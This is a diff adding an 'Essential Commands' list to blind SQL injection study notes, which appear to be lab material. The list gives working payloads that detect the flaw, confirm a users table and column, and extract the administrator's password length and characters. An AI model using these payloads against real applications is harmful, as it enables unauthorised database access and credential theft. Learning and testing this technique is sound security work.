@@ -42,3 +42,34 @@ We can continue this process to systematically determine the full password for t
 
 > [!NOTE]
 > The SUBSTRING function is called SUBSTR on some types of database. For more details, see the SQL injection cheat sheet.
+
+### Essential Commands -
+
+1. Discovering blind SQLi
+```
+xyz' AND '1'='1
+xyz' AND '1'='2
+```
+2. Identifying table name
+```
+xyz' and (select table_name from information_schema.tables where table_name='users')='users
+```
+3. Identifying column name
+```
+xyz' and (select column_name from information_schema.columns where table_name='users' and column_name='username')='username
+```
+4. Identifying column value length
+```
+xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+
+xyz' and (select length(password) from users where username='administrator')>'1
+
+xyz' and (select length(password) from users where username='administrator')>1-- 
+```
+5. Identifying column value
+```
+xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+
+xyz' and substring((select password from users where username='administrator'),1,1)='a
+```
+6. 
